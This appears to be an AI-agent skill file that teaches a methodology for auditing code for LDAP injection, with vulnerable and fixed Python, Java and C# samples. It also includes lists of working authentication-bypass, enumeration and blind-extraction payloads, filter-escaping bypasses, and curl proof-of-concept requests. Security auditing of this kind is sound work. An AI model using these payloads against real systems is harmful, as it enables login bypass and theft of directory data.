---
name: ldap-injection-audit
description: Detection methodology for LDAP injection vulnerabilities
---

# Domain Expertise

# LDAP Injection Auditor

## Expertise

You are an LDAP injection specialist with comprehensive knowledge of LDAP filter syntax, Distinguished Name construction, and directory service vulnerabilities. You understand RFC 4515 filter grammar, escaping requirements, and the various LDAP operations that can be exploited. Your expertise covers Active Directory, OpenLDAP, and other directory implementations, including their unique behaviors and exploitation techniques.

## Core Proficiency

- **Escaping rules**: Understanding LDAP-specific character encoding
- **Filter grammar**: RFC 4515 search filter syntax and semantics
- **DN injection**: Distinguished Name manipulation attacks
- **Authentication mechanisms**: LDAP bind operation vulnerabilities

## Focus Areas

### LDAP Filter Construction
```python
# VULNERABLE: String interpolation in filter
def search_user(username):
    filter_str = f"(&(objectClass=user)(sAMAccountName={username}))"
    return ldap_conn.search(base_dn, filter_str)

# VULNERABLE: Format string
filter_str = "(&(uid=%s)(department=%s))" % (uid, dept)

# SAFE: Proper escaping
from ldap3.utils.conv import escape_filter_chars
filter_str = f"(&(uid={escape_filter_chars(uid)}))"
```

### DN (Distinguished Name) Injection
```python
# VULNERABLE: User input in DN
def get_user_dn(username):
    return f"cn={username},ou=users,dc=company,dc=com"

# Attack: username = "admin,ou=admins,dc=company,dc=com"
# Results in: cn=admin,ou=admins,dc=company,dc=com,ou=users,dc=company,dc=com
```

### Authentication Bypass via Injection
```python
# VULNERABLE: Auth bypass possible
def authenticate(username, password):
    filter_str = f"(&(uid={username})(userPassword={password}))"
    result = ldap_conn.search(base_dn, filter_str)
    return len(result) > 0

# Attack: username = "*" and password = "*"
# Or: username = "admin)(&))" to bypass password check
```

### Wildcard Exploitation
```python
# VULNERABLE: Allows wildcard enumeration
def search_users(query):
    filter_str = f"(cn={query})"
    return ldap_conn.search(base_dn, filter_str)

# Attack: query = "*" returns all users
# Attack: query = "a*" enumerates users starting with 'a'
```

## Red Flags and Warning Signs

1. **String formatting in filters**: f-strings, %, .format() with user input
2. **DN construction**: User input in Distinguished Name strings
3. **Missing escaping**: No use of escape_filter_chars or equivalent
4. **Authentication filters**: Login checks via LDAP search
5. **User enumeration endpoints**: Search functionality without rate limiting
6. **Attribute selection**: User-controlled attribute lists
7. **Bind operations**: User-controlled bind DN
8. **LDAP URLs**: User input in ldap:// URLs

## Attack Patterns

### Wildcard for Enumeration
```
# Return all entries
*

# Enumerate by prefix
a*
admin*
john*

# Enumerate by character position
a*
*a
*a*
```

### Filter Closing and Condition Addition
```
# Original: (&(uid=INPUT)(password=secret))
# Attack: INPUT = admin)(|(&)
# Result: (&(uid=admin)(|(&))(password=secret))
# The (|(&)) always evaluates to true

# Original: (uid=INPUT)
# Attack: INPUT = *)(objectClass=*
# Result: (uid=*)(objectClass=*)
# Returns all entries matching any class
```

### Null Byte Injection
```
# Some implementations are vulnerable
admin%00

# Can truncate filter
admin%00)(whatever
```

### Authentication Bypass Patterns
```
# Classic bypass - always true condition
*)(&
*)(uid=*))(|(uid=*
admin)(&))

# Password bypass
*)(|(password=*

# Alternative always-true
*)(objectClass=user)(|(uid=*
```

### Attribute Extraction via Error-Based
```
# If errors reveal attribute values
(uid=admin)(password=a*)  # Check if password starts with 'a'
(uid=admin)(password=ab*) # Narrow down character by character
```

## Analysis Methodology

1. **Identify LDAP operations**: Find all directory service interactions
2. **Trace user input**: Map request parameters to filter/DN construction
3. **Check escaping**: Is escape_filter_chars or equivalent used?
4. **Review authentication**: How are credentials verified via LDAP?
5. **Audit search functions**: Can wildcards be injected?
6. **Examine DN building**: Is user input in Distinguished Names?
7. **Test null byte handling**: Some implementations are vulnerable
8. **Review bind operations**: User-controlled bind DN or password

## Common Protection Bypasses

### Basic Escaping Bypass
```
# If only * is escaped
)(cn=*

# If parentheses escaped but not backslash
\28  # Encoded (
\29  # Encoded )

# Unicode normalization issues
＊  # Fullwidth asterisk
```

### Filter Logic Manipulation
```
# Exploit AND/OR precedence
*)(|(objectClass=*)
admin)(!(objectClass=invalid

# Nested filter exploitation
*))(&(objectClass=*)(&
```

### Character Encoding Bypass
```
# Hex encoding
\2a  # *
\28  # (
\29  # )
\5c  # \
\00  # NULL

# URL encoding in web context
%2a  # *
%28  # (
```

## Example Vulnerable Code

### Example 1: User Authentication
```python
# auth.py - Vulnerable LDAP auth
import ldap3

def authenticate_user(username, password):
    server = ldap3.Server('ldap://dc.company.com')

    # VULNERABLE: Filter injection
    search_filter = f"(&(objectClass=user)(sAMAccountName={username}))"

    conn = ldap3.Connection(server, auto_bind=True)
    conn.search(
        search_base='dc=company,dc=com',
        search_filter=search_filter,
        attributes=['dn']
    )

    if conn.entries:
        user_dn = conn.entries[0].entry_dn
        # Attempt bind with user credentials
        try:
            user_conn = ldap3.Connection(server, user_dn, password, auto_bind=True)
            return True
        except:
            return False
    return False

# Attack: username = "*)(|(objectClass=*" - enumerate all users
# Attack: username = "admin)(&)" - potential auth bypass
```

### Example 2: Employee Directory Search
```java
// DirectoryService.java - Vulnerable search
@RestController
public class DirectoryService {

    @Autowired
    private LdapTemplate ldapTemplate;

    @GetMapping("/search")
    public List<Employee> searchEmployees(@RequestParam String name) {
        // VULNERABLE: No escaping of user input
        String filter = "(&(objectClass=person)(cn=" + name + "))";

        return ldapTemplate.search(
            "ou=employees",
            filter,
            new EmployeeAttributesMapper()
        );
    }
}

// Attack: ?name=*)(objectClass=* - return all entries
// Attack: ?name=admin)(userPassword=* - enumerate password hashes
```

### Example 3: Group Membership Check
```python
# groups.py - Vulnerable group check
def is_user_in_group(username, group_name):
    # VULNERABLE: Both parameters injectable
    filter_str = f"(&(objectClass=group)(cn={group_name})(member=uid={username},ou=users,dc=company,dc=com))"

    result = ldap_conn.search(
        base_dn='dc=company,dc=com',
        search_filter=filter_str,
        search_scope=ldap3.SUBTREE
    )

    return len(ldap_conn.entries) > 0

# Attack: group_name = "admins)(|(cn=*" - bypass group check
# Attack: username = "*,ou=admins" - DN injection
```

## Output Format

```markdown
## LDAP Injection Finding

**Location**: [file:line]
**Severity**: High/Critical
**Confidence**: High/Medium/Low

**LDAP Implementation**: [Active Directory/OpenLDAP/etc.]

**Vulnerable Code**:
[code block]

**Injection Point**: [parameter/variable name]
**Injection Type**: [Filter/DN/Attribute/Bind]

**Attack Vector**:
```
[Specific injection payload]
```

**Impact**:
- Authentication bypass: [Yes/No]
- User enumeration: [Yes/No]
- Data extraction: [Yes/No - what data]
- Privilege escalation: [Yes/No]

**Proof of Concept**:
```bash
# Filter injection test
curl "http://target/search?name=*)(objectClass=*"

# Auth bypass test
curl -X POST "http://target/login" \
  -d "username=admin)(%26)&password=anything"
```

**Remediation**:
1. Use ldap3.utils.conv.escape_filter_chars() for filter values
2. Use ldap3.utils.dn.escape_rdn() for DN components
3. Implement whitelist validation for expected input formats
4. Use parameterized queries if library supports them
5. Validate input against regex patterns before LDAP operations
```

---

# Detection Methodology

# LDAP Injection Detection

## Methodology

### Step 1: Identify LDAP Libraries and Connection Points

Locate all LDAP client usage. Injection occurs in search filter construction and DN composition.

**Python (ldap3 / python-ldap):**
```python
conn.search('dc=example,dc=com', f'(uid={username})')    # DANGEROUS
l.search_s(base, ldap.SCOPE_SUBTREE, filterstr)          # Injection target
```

**Java (JNDI / UnboundID):**
```java
ctx.search(base, "(uid=" + username + ")", controls);     // DANGEROUS
Filter.create("(uid=" + username + ")");                  // DANGEROUS
```

**C# / .NET:**
```csharp
searcher.Filter = "(uid=" + username + ")";               // DANGEROUS
DirectoryEntry entry = new DirectoryEntry(
    "LDAP://dc=example,dc=com/" + userDn);                // DN injection
```

### Step 2: Identify LDAP Filter Metacharacters

| Character | Hex Escape | Effect |
|---|---|---|
| `*` | `\2a` | Wildcard match |
| `(` | `\28` | Opens filter clause |
| `)` | `\29` | Closes filter clause |
| `\` | `\5c` | Escape character |
| `NUL` | `\00` | Null byte truncation |

**Authentication bypass payload:**
```
# Filter: (&(uid=USERNAME)(userPassword=PASSWORD))
# Injected username: admin)(|(uid=*
# Result: (&(uid=admin)(|(uid=*))(userPassword=anything))
```

### Step 3: Trace User Input into Filter and DN Strings

```python
# VULNERABLE: direct string interpolation
search_filter = f'(&(uid={username})(userPassword={password}))'
conn.search('dc=example,dc=com', search_filter)
```

```python
# VULNERABLE: DN injection in bind
dn = f"uid={username},ou=users,dc=example,dc=com"
conn = Connection(server, user=dn, password=password)
```

### Step 4: Check for Proper Escaping and Parameterization

```python
# SAFE: ldap3 escaping
from ldap3.utils.conv import escape_filter_chars
username_safe = escape_filter_chars(username)
```

```java
// SAFE: JNDI parameterized filter
String filter = "(uid={0})";
ctx.search(base, filter, new Object[]{username}, controls);

// SAFE: UnboundID typed Filter API
Filter filter = Filter.createEqualityFilter("uid", username);
```

### Step 5: Check DN Construction for Injection

```python
from ldap3.utils.dn import escape_rdn
safe_username = escape_rdn(username)
dn = f"uid={safe_username},ou=users,dc=example,dc=com"
```

```java
String safeName = Rdn.escapeValue(username);
```

### Step 6: Check for Blind LDAP Injection

```
# Boolean-based: attacker infers data from response behavior
# (&(uid=admin)(password=a*))  -> 200 OK (character matches)
# (&(uid=admin)(password=b*))  -> 401 (no match)
```

## Decision Tree

```
User input reaches LDAP filter or DN construction?
|
+-- NO --> SAFE
|
+-- YES
    |
    +-- Filter injection path
    |   |
    |   Parameterized filter (JNDI {0}, UnboundID Filter API)?
    |   +-- YES --> SAFE
    |   +-- NO
    |       |
    |       escape_filter_chars() or equivalent?
    |       +-- YES (all metacharacters) --> SAFE
    |       +-- Partial --> HARDENED (Medium)
    |       +-- NO --> VULNERABLE (Critical)
    |
    +-- DN injection path
        |
        DN escaping applied?
        +-- YES --> SAFE
        +-- NO --> VULNERABLE (High)
```

## Real-World Examples

### Example 1: Authentication Bypass via Filter Injection

```python
@app.route('/api/auth', methods=['POST'])
def authenticate():
    data = request.get_json()
    conn.search('dc=corp,dc=com',
        f'(&(sAMAccountName={data["username"]})(userPassword={data["password"]}))',
        attributes=['cn', 'mail', 'memberOf'])
    if conn.entries:
        return jsonify({"user": conn.entries[0].cn.value}), 200
    return jsonify({"error": "Invalid credentials"}), 401
```

**Why vulnerable:** Attacker sends `{"username": "admin)(&)", "password": "anything"}`. The `(&)` is an LDAP TRUE filter, bypassing password verification.

**Impact:** Complete authentication bypass for any known user.

**Fix:**
```python
from ldap3.utils.conv import escape_filter_chars

username = escape_filter_chars(data['username'])
conn.search('dc=corp,dc=com', f'(sAMAccountName={username})', attributes=['cn'])
if conn.entries:
    user_dn = conn.entries[0].entry_dn
    auth_conn = Connection(server, user=user_dn, password=data['password'])
    if auth_conn.bind():
        return jsonify({"user": conn.entries[0].cn.value}), 200
```

### Example 2: Directory Enumeration via JNDI Filter Injection

```java
@GetMapping("/api/users/search")
public List<UserDTO> searchUsers(@RequestParam String department) {
    String filter = "(department=" + department + ")";
    NamingEnumeration<?> results = ctx.search("ou=users,dc=corp,dc=com", filter, controls);
    // ... process results
}
```

**Why vulnerable:** Injecting `Engineering)(|(objectClass=*` matches every directory object, dumping the entire user directory.

**Impact:** Full directory enumeration exposing emails, phone numbers, group memberships.

**Fix:**
```java
String filter = "(department={0})";
Object[] filterArgs = { department };
ctx.search("ou=users,dc=corp,dc=com", filter, filterArgs, controls);
```

### Example 3: DN Injection in .NET Password Reset

```csharp
public bool ResetPassword(string username, string newPassword) {
    string userDn = "CN=" + username + ",OU=Users,DC=corp,DC=com";
    DirectoryEntry user = new DirectoryEntry("LDAP://" + server + "/" + userDn);
    user.Invoke("SetPassword", new object[] { newPassword });
    user.CommitChanges();
    return true;
}
```

**Why vulnerable:** Attacker submits `username=admin,OU=Admins,DC=corp,DC=com` to change the bind DN and reset a domain admin's password.

**Impact:** Privilege escalation via arbitrary account password reset.

**Fix:**
```csharp
// Search for user by sAMAccountName, then use their actual DN
DirectorySearcher searcher = new DirectorySearcher(rootEntry);
searcher.Filter = "(sAMAccountName=" + EscapeLdapFilter(username) + ")";
SearchResult result = searcher.FindOne();
if (result == null) return false;
DirectoryEntry user = result.GetDirectoryEntry();
user.Invoke("SetPassword", new object[] { newPassword });
```

## Common False Positive Patterns

1. **JNDI parameterized filters with {0}** -- Auto-escapes metacharacters. Safe by design.

2. **UnboundID typed Filter API** -- `Filter.createEqualityFilter("uid", input)` constructs properly escaped filters.

3. **Hardcoded LDAP filters in configuration** -- Filters like `(objectClass=person)` with no user input.

4. **Spring LDAP `LdapQueryBuilder`** -- `query().where("uid").is(username)` handles escaping internally.

5. **LDAP queries with input from internal services** -- Parameters from authenticated internal APIs, not user HTTP input.

6. **Read-only lookups by session-stored DN** -- DN was validated at authentication time.

7. **LDAP connection pool configuration** -- Bind DNs in property files not influenced by runtime user input.
